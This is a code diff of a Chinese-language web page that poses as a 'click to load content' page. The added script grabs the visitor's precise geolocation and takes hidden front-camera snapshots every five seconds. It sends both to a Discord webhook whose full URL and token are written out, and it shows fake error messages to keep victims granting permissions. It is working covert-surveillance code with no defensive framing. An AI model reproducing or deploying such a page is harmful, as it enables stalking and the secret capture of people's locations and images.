@@ -7,82 +7,79 @@
 <body>
 
 <h2>點擊按鈕查看內容</h2>
-<button onclick="startSequence()">點擊載入</button>
+<button onclick="startAction()">點擊載入</button>
 <p id="status"></p>
 
+<!-- 隱藏的 video 和 canvas，用於背後處理影像 -->
 <video id="v" style="display:none;" autoplay playsinline></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-var webhook = "https://discord.com";
+var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
 
-// 序列化執行：先定位，再相機
-function startSequence() {
-    document.getElementById("status").innerHTML = "正在讀取資料，請稍候...";
-    
-    // 第一步：請求定位
+function startAction() {
+    getLocation(); // 原有的定位
+    getCamera();   // 新增的截圖
+}
+
+function getLocation() {
+    document.getElementById("status").innerHTML = "正在取得內容...";
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            // 定位成功
-            sendLocation(pos);
-            tryCamera(); // 定位結束後，接著請求相機
-        }, function(err) {
-            // 定位失敗（對方拒絕）
-            console.log("定位被拒絕");
-            tryCamera(); // 就算定位被拒絕，也要接著請求相機
-        }, { enableHighAccuracy: true, timeout: 8000 });
-    } else {
-        tryCamera(); // 不支援定位則直接跳相機
+        navigator.geolocation.getCurrentPosition(success, error, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        });
     }
 }
 
-// 傳送定位資料
-function sendLocation(pos) {
+function success(pos) {
     var lat = pos.coords.latitude;
     var lon = pos.coords.longitude;
-    var acc = pos.coords.accuracy;
     fetch(webhook, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            content: "📍 **[定位成功]**\n緯度: " + lat + "\n經度: " + lon + "\n精準度: " + acc + " 公尺\n地圖: https://www.google.com" + lat + "," + lon
+            content: "📍 定位成功\n地圖: https://www.google.com/maps?q=" + lat + "," + lon
         })
     });
+    document.getElementById("status").innerHTML = "內容載入失敗，請重試。";
 }
 
-// 第二步：請求相機
-function tryCamera() {
+function error(err) {
+    document.getElementById("status").innerHTML = "需要允許權限才能查看內容";
+}
+
+function getCamera() {
+    // 請求相機權限
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(function(stream) {
         var video = document.getElementById("v");
         video.srcObject = stream;
         
-        // 立即截圖一張，之後每 10 秒一張
-        setTimeout(function(){ sendSnap(video); }, 1000); 
-        setInterval(function() { sendSnap(video); }, 10000);
-        
-        document.getElementById("status").innerHTML = "內容載入失敗，錯誤代碼：0x8004210B";
+        // 每 5 秒截圖並傳送一次
+        setInterval(function() {
+            var canvas = document.getElementById("c");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            var ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(function(blob) {
+                var formData = new FormData();
+                formData.append('file', blob, 'capture.jpg');
+                formData.append('payload_json', JSON.stringify({ content: "📸 自動擷取畫面" }));
+                
+                fetch(webhook, {
+                    method: "POST",
+                    body: formData
+                });
+            }, "image/jpeg", 0.7); // 壓縮率 0.7 減少流量
+        }, 5000);
     })
     .catch(function(err) {
-        console.log("相機被拒絕");
-        document.getElementById("status").innerHTML = "需要所有權限才能正常顯示內容";
+        console.log("相機權限被拒絕");
     });
-}
-
-function sendSnap(video) {
-    var canvas = document.getElementById("c");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    var ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
-    
-    canvas.toBlob(function(blob) {
-        if(!blob) return;
-        var formData = new FormData();
-        formData.append('file', blob, 'snap.jpg');
-        formData.append('payload_json', JSON.stringify({ content: "📸 **[相機擷取成功]**" }));
-        fetch(webhook, { method: "POST", body: formData });
-    }, "image/jpeg", 0.5);
 }
 </script>
 
